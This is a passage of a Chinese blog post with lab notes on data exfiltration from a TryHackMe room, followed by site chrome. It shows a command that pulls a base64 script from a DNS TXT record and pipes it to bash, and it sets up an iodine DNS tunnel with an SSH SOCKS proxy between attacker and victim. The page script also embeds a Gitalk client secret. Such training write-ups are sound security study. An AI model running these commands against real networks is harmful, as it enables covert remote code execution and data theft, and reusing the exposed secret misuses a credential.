+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">ping -c 1 test.thm.com</span><br></pre></td></tr></table></figure>
+<p>  首先将其转化为 <code>base64</code>：<code>IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo=</code></p>
+<p>  随后将其作为 <code>DNS</code> 记录添加到域名解析中：</p>
+<p>  <img src="https://pic.imgdb.cn/item/673b3b48d29ded1a8cb61098.png" alt=""></p>
+<p>  使用这个来直接执行</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> dig +short -t TXT script.tunnel.com | tr -d &quot;\&quot;&quot; | base64 -d | bash</span><br><span class="line"># tr清理输出内容并删除内容中所有双引号，解码后传给/bin/bash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>DNS</code> 隧道 - <code>TCP over DNS</code></p>
+<p>  使用 <code>DNS</code> 数据渗出将其他协议(如http)封装在 <code>DNS</code> 上，从而实现一个可以持续发送接受数据的通信通道</p>
+<p>  <img src="https://pic.imgdb.cn/item/673b3c29d29ded1a8cb6e6fb.png" alt=""></p>
+<p>  目标是在 <code>网络1：172.20.0.0/24</code> 与 <code>网络2：192.168.0.0/24</code> 之间建立通信</p>
+<p>  引入一个工具 <a target="_blank" rel="noopener" href="https://github.com/yarrick/iodine"><code>iodine</code></a></p>
+<ul>
+<li><p>在攻击端</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com</span><br></pre></td></tr></table></figure>
+<p>  该命令将创建一个新网络接口 <code>dns0</code></p>
+<p>  <code>10.1.1.1/24</code> 表示新网络接口 <code>dns0</code> 设置的网络 <code>IP</code> ，<code>att.tunnel.com</code> 是预先设置好的名称服务器，其指向 <code>attacker.thm.com</code> 机器</p>
+</li>
+<li><p>在受害者端</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iodine -P thmpass att.tunnel.com</span><br></pre></td></tr></table></figure>
+<p>于此完成隧道建设，可以在攻击端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh thm@10.1.1.2 -4 -f -N -D 1080</span><br></pre></td></tr></table></figure>
+<p>进行端口转发</p>
+</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>noone___
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://noone40404.github.io/2024/11/17/THM%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%AF%8423%EF%BC%9AData%20Exfiltration/" title="THM学习日寄23-Data Exfiltration">http://noone40404.github.io/2024/11/17/THM学习日寄23：Data Exfiltration/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/THM/" rel="tag"><i class="fa fa-tag"></i> THM</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="fa fa-tag"></i> 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/11/17/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8421%EF%BC%9AYear%20of%20the%20Fox/" rel="prev" title="THM打靶日寄21-Year of the Fox">
+      <i class="fa fa-chevron-left"></i> THM打靶日寄21-Year of the Fox
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/11/18/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8424%EF%BC%9ADifferent%20CTF/" rel="next" title="THM打靶日寄24-Different CTF">
+      THM打靶日寄24-Different CTF <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="noone___"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">noone___</p>
+  <div class="site-description" itemprop="description">自闭中</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">151</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">78</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/noone40404" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;noone40404" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://ctp314.github.io/" title="https:&#x2F;&#x2F;ctp314.github.io&#x2F;" rel="noopener" target="_blank">CTime_Pup_314</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/guanlexiangfan/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;guanlexiangfan&#x2F;" rel="noopener" target="_blank">Evitagen</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.luogu.com.cn/blog/i-am-zhiyangfan/" title="https:&#x2F;&#x2F;www.luogu.com.cn&#x2F;blog&#x2F;i-am-zhiyangfan&#x2F;" rel="noopener" target="_blank">zhiyangfan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/Vitheon/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Vitheon&#x2F;" rel="noopener" target="_blank">Vareal</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">noone___</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+  <script data-pjax>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'ebdb5b537395179b4514',
+      clientSecret: 'd0843e5853efe963ca9983db6cac3a1f9d736856',
+      repo        : 'noone40404.github.io',
+      owner       : 'noone40404',
+      admin       : ['noone40404'],
+      id          : 'ef9b3d605dc6c8d983baaa0da782fc68',
+        language: 'zn-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+    </div>
+</body>
+</html>
